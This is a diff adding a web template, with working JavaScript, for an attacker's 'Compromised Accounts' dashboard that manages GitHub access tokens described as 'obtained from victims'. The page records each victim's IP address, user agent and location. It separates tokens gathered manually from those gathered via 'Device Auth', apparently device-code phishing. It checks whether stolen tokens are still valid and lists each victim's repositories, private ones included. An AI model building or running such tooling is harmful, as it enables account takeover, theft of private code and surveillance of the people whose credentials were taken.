@@ -1,0 +1,649 @@
+{% extends "base.html" %}
+
+{% block page_title %}Compromised Accounts{% endblock %}
+
+{% block content %}
+<style>
+    .account-card {
+        transition: transform 0.2s;
+    }
+    .account-card:hover {
+        transform: translateY(-2px);
+    }
+    .source-badge {
+        font-size: 0.75em;
+        margin: 2px;
+    }
+    .victim-info {
+        font-size: 0.85em;
+        color: var(--text-secondary);
+    }
+    .analyzed-badge {
+        background: linear-gradient(45deg, #28a745, #20c997);
+    }
+    .unanalyzed-badge {
+        background: linear-gradient(45deg, #ffc107, #fd7e14);
+    }
+    .stats-card {
+        background: linear-gradient(135deg, var(--bg-card) 0%, var(--bg-secondary) 100%);
+        border: 1px solid var(--border-primary);
+        border-radius: 12px;
+        padding: 1.5rem;
+        margin-bottom: 1rem;
+    }
+    /* Ensure dropdown menus appear above cards and overlays */
+    .dropdown-menu {
+        z-index: 2000;
+    }
+    .dropdown {
+        position: relative;
+    }
+    /* If needed, make the card relative for stacking context */
+    .account-card {
+        position: relative;
+    }
+    /* Prevent dropdown clipping by parent .row/.col */
+    #accountsContainer.row {
+        overflow: visible !important;
+    }
+    #accountsContainer .col-md-6,
+    #accountsContainer .col-lg-4,
+    #accountsContainer .mb-3 {
+        overflow: visible !important;
+    }
+</style>
+
+<div class="container-fluid">
+    <div class="row">
+        <div class="col-12">
+            <div class="d-flex justify-content-between align-items-center mb-4">
+                <div>
+                    <h2 class="mb-1">
+                        <i class="fas fa-user-secret me-2 text-danger"></i>
+                        Compromised Accounts
+                    </h2>
+                    <p class="text-muted mb-0">Manage GitHub accounts obtained from victims</p>
+                </div>
+                <button class="btn btn-danger" data-bs-toggle="modal" data-bs-target="#addCompromisedModal">
+                    <i class="fas fa-plus me-2"></i>Add Compromised Account
+                </button>
+            </div>
+
+            <!-- Statistics Cards -->
+            <div class="row mb-4" id="statsContainer">
+                <div class="col-md-3">
+                    <div class="stats-card text-center">
+                        <h3 class="text-danger mb-1" id="totalAccounts">0</h3>
+                        <small class="text-muted">Total Compromised</small>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="stats-card text-center">
+                        <h3 class="text-success mb-1" id="validAccounts">0</h3>
+                        <small class="text-muted">Valid Tokens</small>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="stats-card text-center">
+                        <h3 class="text-warning mb-1" id="deviceAuthAccounts">0</h3>
+                        <small class="text-muted">From Device Auth</small>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="stats-card text-center">
+                        <h3 class="text-info mb-1" id="analyzedAccounts">0</h3>
+                        <small class="text-muted">Analyzed</small>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Filter Tabs -->
+            <ul class="nav nav-tabs mb-3" id="filterTabs" role="tablist">
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link active" id="all-tab" data-bs-toggle="tab" data-bs-target="#all" 
+                            type="button" role="tab" onclick="filterAccounts('all')">
+                        <i class="fas fa-list me-2"></i>All Accounts
+                    </button>
+                </li>
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link" id="manual-tab" data-bs-toggle="tab" data-bs-target="#manual" 
+                            type="button" role="tab" onclick="filterAccounts('manual')">
+                        <i class="fas fa-hand-paper me-2"></i>Manual
+                    </button>
+                </li>
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link" id="device-auth-tab" data-bs-toggle="tab" data-bs-target="#device-auth" 
+                            type="button" role="tab" onclick="filterAccounts('device_auth')">
+                        <i class="fas fa-mobile-alt me-2"></i>Device Auth
+                    </button>
+                </li>
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link" id="unanalyzed-tab" data-bs-toggle="tab" data-bs-target="#unanalyzed" 
+                            type="button" role="tab" onclick="filterAccounts('unanalyzed')">
+                        <i class="fas fa-exclamation-triangle me-2"></i>Unanalyzed
+                    </button>
+                </li>
+            </ul>
+
+            <!-- Accounts Container -->
+            <div class="row" id="accountsContainer">
+                <!-- Accounts will be loaded here -->
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Add Compromised Account Modal -->
+<div class="modal fade" id="addCompromisedModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">
+                    <i class="fas fa-user-secret me-2 text-danger"></i>
+                    Add Compromised Account
+                </h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="addCompromisedForm">
+                    <div class="mb-3">
+                        <label for="compromisedToken" class="form-label">
+                            <i class="fas fa-key me-2"></i>GitHub Personal Access Token
+                        </label>
+                        <textarea class="form-control" id="compromisedToken" rows="3" 
+                                placeholder="ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" required></textarea>
+                        <div class="form-text">
+                            Enter the compromised GitHub PAT obtained from the victim
+                        </div>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label for="victimIP" class="form-label">
+                            <i class="fas fa-globe me-2"></i>Victim IP Address (Optional)
+                        </label>
+                        <input type="text" class="form-control" id="victimIP" 
+                               placeholder="192.168.1.100">
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label for="victimUserAgent" class="form-label">
+                            <i class="fas fa-desktop me-2"></i>Victim User Agent (Optional)
+                        </label>
+                        <input type="text" class="form-control" id="victimUserAgent" 
+                               placeholder="Mozilla/5.0 (Windows NT 10.0; Win64; x64)...">
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label for="victimLocation" class="form-label">
+                            <i class="fas fa-map-marker-alt me-2"></i>Victim Location (Optional)
+                        </label>
+                        <input type="text" class="form-control" id="victimLocation" 
+                               placeholder="New York, NY, USA">
+                    </div>
+                </form>
+                
+                <div id="addCompromisedError" class="alert alert-danger d-none"></div>
+                <div id="addCompromisedSuccess" class="alert alert-success d-none"></div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                <button type="button" class="btn btn-danger" id="addCompromisedBtn">
+                    <i class="fas fa-plus me-2"></i>Add Compromised Account
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Repository Modal -->
+<div class="modal fade" id="repositoryModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="repositoryModalTitle">
+                    <i class="fab fa-github me-2"></i>Repositories
+                </h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <div id="repositoryLoading" class="text-center">
+                    <div class="spinner-border text-primary" role="status">
+                        <span class="visually-hidden">Loading repositories...</span>
+                    </div>
+                    <p class="mt-2">Loading repositories...</p>
+                </div>
+                <div id="repositoryContent" class="d-none">
+                    <!-- Repository list will be loaded here -->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Remove Compromised Account Modal -->
+<div class="modal fade" id="removeCompromisedModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header bg-danger text-white">
+                <h5 class="modal-title">
+                    <i class="fas fa-trash me-2"></i>Remove Compromised Account
+                </h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <div id="removeCompromisedError" class="alert alert-danger d-none"></div>
+                <p>Are you sure you want to <span class="fw-bold text-danger">permanently remove</span> the compromised account for <span id="removeCompromisedUsername" class="fw-bold"></span>?</p>
+                <p class="mb-0 text-muted"><small>This action cannot be undone.</small></p>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                <button type="button" class="btn btn-danger" id="confirmRemoveCompromisedBtn">
+                    <i class="fas fa-trash me-2"></i>Remove Account
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+let currentFilter = 'all';
+let compromisedAccounts = [];
+let removeAccountId = null;
+
+// Load accounts and statistics on page load
+document.addEventListener('DOMContentLoaded', function() {
+    loadCompromisedAccounts();
+    loadStatistics();
+});
+
+// Load compromised accounts
+async function loadCompromisedAccounts() {
+    try {
+        const response = await fetch('/api/compromised/accounts');
+        if (response.ok) {
+            compromisedAccounts = await response.json();
+            renderAccounts();
+        } else {
+            console.error('Failed to load compromised accounts');
+        }
+    } catch (error) {
+        console.error('Error loading compromised accounts:', error);
+    }
+}
+
+// Load statistics
+async function loadStatistics() {
+    try {
+        const response = await fetch('/api/compromised/statistics');
+        if (response.ok) {
+            const stats = await response.json();
+            document.getElementById('totalAccounts').textContent = stats.total_accounts;
+            document.getElementById('validAccounts').textContent = stats.valid_accounts;
+            document.getElementById('deviceAuthAccounts').textContent = stats.device_auth_accounts;
+            document.getElementById('analyzedAccounts').textContent = stats.analyzed_accounts;
+        }
+    } catch (error) {
+        console.error('Error loading statistics:', error);
+    }
+}
+
+// Filter accounts
+function filterAccounts(filter) {
+    currentFilter = filter;
+    renderAccounts();
+}
+
+// Render accounts based on current filter
+function renderAccounts() {
+    const container = document.getElementById('accountsContainer');
+    let filteredAccounts = compromisedAccounts;
+    
+    // Apply filter
+    if (currentFilter === 'manual') {
+        filteredAccounts = compromisedAccounts.filter(acc => acc.source === 'manual');
+    } else if (currentFilter === 'device_auth') {
+        filteredAccounts = compromisedAccounts.filter(acc => acc.source === 'device_auth');
+    } else if (currentFilter === 'unanalyzed') {
+        filteredAccounts = compromisedAccounts.filter(acc => !acc.is_analyzed);
+    }
+    
+    if (filteredAccounts.length === 0) {
+        container.innerHTML = `
+            <div class="col-12">
+                <div class="text-center py-5">
+                    <i class="fas fa-user-secret fa-3x text-muted mb-3"></i>
+                    <h4 class="text-muted">No compromised accounts found</h4>
+                    <p class="text-muted">Add compromised accounts to start analyzing victim data.</p>
+                </div>
+            </div>
+        `;
+        return;
+    }
+    
+    container.innerHTML = filteredAccounts.map(account => `
+        <div class="col-md-6 col-lg-4 mb-3">
+            <div class="card account-card h-100">
+                <div class="card-body">
+                    <div class="d-flex align-items-center mb-3">
+                        <img src="${account.avatar_url || '/static/default-avatar.png'}" 
+                             alt="${account.username}" class="rounded-circle me-3" width="40" height="40">
+                        <div class="flex-grow-1">
+                            <h6 class="mb-1">${account.username}</h6>
+                            <small class="text-muted">${account.name || 'No name'}</small>
+                        </div>
+                        <div class="dropdown">
+                            <button class="btn btn-sm btn-outline-secondary" data-bs-toggle="dropdown">
+                                <i class="fas fa-ellipsis-v"></i>
+                            </button>
+                            <ul class="dropdown-menu">
+                                <li><a class="dropdown-item" href="#" onclick="viewRepositories(${account.id})">
+                                    <i class="fab fa-github me-2"></i>View Repositories
+                                </a></li>
+                                <li><a class="dropdown-item" href="#" onclick="validateAccount(${account.id})">
+                                    <i class="fas fa-check-circle me-2"></i>Validate Token
+                                </a></li>
+                                ${!account.is_analyzed ? `
+                                <li><a class="dropdown-item" href="#" onclick="markAnalyzed(${account.id})">
+                                    <i class="fas fa-eye me-2"></i>Mark as Analyzed
+                                </a></li>
+                                ` : `
+                                <li><a class="dropdown-item" href="#" onclick="unmarkAnalyzed(${account.id})">
+                                    <i class="fas fa-eye-slash me-2"></i>Mark as Unanalyzed
+                                </a></li>
+                                `}
+                                <li><hr class="dropdown-divider"></li>
+                                <li><a class="dropdown-item text-danger" href="#" onclick="showRemoveCompromisedModal(${account.id}, '${account.username.replace(/'/g, "\\'")}')">
+                                    <i class="fas fa-trash me-2"></i>Remove
+                                </a></li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-2">
+                        <span class="badge source-badge ${account.source === 'device_auth' ? 'bg-warning' : 'bg-info'}">
+                            <i class="fas ${account.source === 'device_auth' ? 'fa-mobile-alt' : 'fa-hand-paper'} me-1"></i>
+                            ${account.source === 'device_auth' ? 'Device Auth' : 'Manual'}
+                        </span>
+                        <span class="badge ${account.is_valid ? 'bg-success' : 'bg-danger'}">
+                            <i class="fas ${account.is_valid ? 'fa-check' : 'fa-times'} me-1"></i>
+                            ${account.is_valid ? 'Valid' : 'Invalid'}
+                        </span>
+                        <span class="badge ${account.is_analyzed ? 'analyzed-badge' : 'unanalyzed-badge'}">
+                            <i class="fas ${account.is_analyzed ? 'fa-eye' : 'fa-exclamation-triangle'} me-1"></i>
+                            ${account.is_analyzed ? 'Analyzed' : 'Unanalyzed'}
+                        </span>
+                    </div>
+                    
+                    <div class="mb-2">
+                        <small class="text-muted d-block">Token: ${account.token_preview}</small>
+                        <small class="text-muted d-block">Added: ${new Date(account.created_at).toLocaleDateString()}</small>
+                    </div>
+                    
+                    ${account.scopes && account.scopes.length > 0 ? `
+                    <div class="mb-2">
+                        <small class="text-muted d-block mb-1">Scopes:</small>
+                        <div>
+                            ${account.scopes.map(scope => `<span class="badge bg-secondary me-1">${scope}</span>`).join('')}
+                        </div>
+                    </div>
+                    ` : ''}
+                    
+                    ${account.victim_ip || account.victim_location ? `
+                    <div class="victim-info mt-2 pt-2 border-top">
+                        <small class="text-muted d-block"><strong>Victim Info:</strong></small>
+                        ${account.victim_ip ? `<small class="text-muted d-block">IP: ${account.victim_ip}</small>` : ''}
+                        ${account.victim_location ? `<small class="text-muted d-block">Location: ${account.victim_location}</small>` : ''}
+                    </div>
+                    ` : ''}
+                </div>
+            </div>
+        </div>
+    `).join('');
+}
+
+// Add compromised account
+document.getElementById('addCompromisedBtn').addEventListener('click', async function() {
+    const token = document.getElementById('compromisedToken').value.trim();
+    const victimIP = document.getElementById('victimIP').value.trim();
+    const victimUserAgent = document.getElementById('victimUserAgent').value.trim();
+    const victimLocation = document.getElementById('victimLocation').value.trim();
+    
+    const errorDiv = document.getElementById('addCompromisedError');
+    const successDiv = document.getElementById('addCompromisedSuccess');
+    
+    // Hide previous messages
+    errorDiv.classList.add('d-none');
+    successDiv.classList.add('d-none');
+    
+    if (!token) {
+        errorDiv.textContent = 'Please enter a GitHub token';
+        errorDiv.classList.remove('d-none');
+        return;
+    }
+    
+    this.disabled = true;
+    this.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i>Adding...';
+    
+    try {
+        const victimInfo = {};
+        if (victimIP) victimInfo.ip = victimIP;
+        if (victimUserAgent) victimInfo.user_agent = victimUserAgent;
+        if (victimLocation) victimInfo.location = victimLocation;
+        
+        const response = await fetch('/api/compromised/accounts', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                token: token,
+                victim_info: Object.keys(victimInfo).length > 0 ? victimInfo : undefined
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            successDiv.textContent = result.message;
+            successDiv.classList.remove('d-none');
+            
+            // Reset form
+            document.getElementById('addCompromisedForm').reset();
+            
+            // Reload accounts and statistics
+            await loadCompromisedAccounts();
+            await loadStatistics();
+            
+            // Close modal after a delay
+            setTimeout(() => {
+                bootstrap.Modal.getInstance(document.getElementById('addCompromisedModal')).hide();
+            }, 1500);
+        } else {
+            errorDiv.textContent = result.error;
+            errorDiv.classList.remove('d-none');
+        }
+    } catch (error) {
+        errorDiv.textContent = 'Failed to add compromised account: ' + error.message;
+        errorDiv.classList.remove('d-none');
+    } finally {
+        this.disabled = false;
+        this.innerHTML = '<i class="fas fa-plus me-2"></i>Add Compromised Account';
+    }
+});
+
+// View repositories
+async function viewRepositories(accountId) {
+    const modal = new bootstrap.Modal(document.getElementById('repositoryModal'));
+    const account = compromisedAccounts.find(acc => acc.id === accountId);
+    
+    document.getElementById('repositoryModalTitle').innerHTML = 
+        `<i class="fab fa-github me-2"></i>Repositories - ${account.username}`;
+    
+    document.getElementById('repositoryLoading').classList.remove('d-none');
+    document.getElementById('repositoryContent').classList.add('d-none');
+    
+    modal.show();
+    
+    try {
+        const response = await fetch(`/api/compromised/accounts/${accountId}/repositories`);
+        const result = await response.json();
+        
+        document.getElementById('repositoryLoading').classList.add('d-none');
+        
+        if (result.success) {
+            const content = document.getElementById('repositoryContent');
+            
+            if (result.repositories.length === 0) {
+                content.innerHTML = `
+                    <div class="text-center py-4">
+                        <i class="fab fa-github fa-3x text-muted mb-3"></i>
+                        <h5 class="text-muted">No repositories found</h5>
+                    </div>
+                `;
+            } else {
+                content.innerHTML = `
+                    <div class="mb-3">
+                        <h6>Found ${result.total_count} repositories</h6>
+                    </div>
+                    <div class="list-group">
+                        ${result.repositories.map(repo => `
+                            <div class="list-group-item">
+                                <div class="d-flex justify-content-between align-items-start">
+                                    <div class="flex-grow-1">
+                                        <h6 class="mb-1">
+                                            <a href="${repo.html_url}" target="_blank" class="text-decoration-none">
+                                                ${repo.full_name}
+                                            </a>
+                                            ${repo.private ? '<span class="badge bg-warning ms-2">Private</span>' : ''}
+                                            ${repo.has_pages ? '<span class="badge bg-info ms-1">Pages</span>' : ''}
+                                        </h6>
+                                        <p class="mb-1 text-muted">${repo.description || 'No description'}</p>
+                                        <small class="text-muted">
+                                            ${repo.language ? `${repo.language} • ` : ''}
+                                            ⭐ ${repo.stargazers_count} • 
+                                            🍴 ${repo.forks_count} • 
+                                            Updated ${new Date(repo.updated_at).toLocaleDateString()}
+                                        </small>
+                                    </div>
+                                </div>
+                            </div>
+                        `).join('')}
+                    </div>
+                `;
+            }
+            
+            content.classList.remove('d-none');
+        } else {
+            document.getElementById('repositoryContent').innerHTML = `
+                <div class="alert alert-danger">
+                    <i class="fas fa-exclamation-triangle me-2"></i>
+                    ${result.error}
+                </div>
+            `;
+            document.getElementById('repositoryContent').classList.remove('d-none');
+        }
+    } catch (error) {
+        document.getElementById('repositoryLoading').classList.add('d-none');
+        document.getElementById('repositoryContent').innerHTML = `
+            <div class="alert alert-danger">
+                <i class="fas fa-exclamation-triangle me-2"></i>
+                Failed to load repositories: ${error.message}
+            </div>
+        `;
+        document.getElementById('repositoryContent').classList.remove('d-none');
+    }
+}
+
+// Validate account
+async function validateAccount(accountId) {
+    try {
+        const response = await fetch(`/api/compromised/accounts/${accountId}/validate`, {
+            method: 'POST'
+        });
+        const result = await response.json();
+        
+        if (result.success) {
+            await loadCompromisedAccounts();
+            await loadStatistics();
+        } else {
+            alert('Validation failed: ' + result.error);
+        }
+    } catch (error) {
+        alert('Failed to validate account: ' + error.message);
+    }
+}
+
+// Mark as analyzed
+async function markAnalyzed(accountId) {
+    try {
+        const response = await fetch(`/api/compromised/accounts/${accountId}/analyze`, {
+            method: 'POST'
+        });
+        const result = await response.json();
+        
+        if (result.success) {
+            await loadCompromisedAccounts();
+            await loadStatistics();
+        } else {
+            alert('Failed to mark as analyzed: ' + result.error);
+        }
+    } catch (error) {
+        alert('Failed to mark as analyzed: ' + error.message);
+    }
+}
+
+// Unmark as analyzed
+async function unmarkAnalyzed(accountId) {
+    try {
+        const response = await fetch(`/api/compromised/accounts/${accountId}/unanalyze`, {
+            method: 'POST'
+        });
+        const result = await response.json();
+        if (result.success) {
+            await loadCompromisedAccounts();
+            await loadStatistics();
+        } else {
+            alert('Failed to unmark as analyzed: ' + result.error);
+        }
+    } catch (error) {
+        alert('Failed to unmark as analyzed: ' + error.message);
+    }
+}
+
+function showRemoveCompromisedModal(accountId, username) {
+    removeAccountId = accountId;
+    document.getElementById('removeCompromisedUsername').textContent = username;
+    document.getElementById('removeCompromisedError').classList.add('d-none');
+    const modal = new bootstrap.Modal(document.getElementById('removeCompromisedModal'));
+    modal.show();
+}
+
+document.getElementById('confirmRemoveCompromisedBtn').addEventListener('click', async function() {
+    if (!removeAccountId) return;
+    const errorDiv = document.getElementById('removeCompromisedError');
+    errorDiv.classList.add('d-none');
+    this.disabled = true;
+    this.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i>Removing...';
+    try {
+        const response = await fetch(`/api/compromised/accounts/${removeAccountId}`, {
+            method: 'DELETE'
+        });
+        const result = await response.json();
+        if (result.success) {
+            await loadCompromisedAccounts();
+            await loadStatistics();
+            bootstrap.Modal.getInstance(document.getElementById('removeCompromisedModal')).hide();
+        } else {
+            errorDiv.textContent = result.error;
+            errorDiv.classList.remove('d-none');
+        }
+    } catch (error) {
+        errorDiv.textContent = 'Failed to remove account: ' + error.message;
+        errorDiv.classList.remove('d-none');
+    } finally {
+        this.disabled = false;
+        this.innerHTML = '<i class="fas fa-trash me-2"></i>Remove Account';
+    }
+});
+</script>
+{% endblock %} 
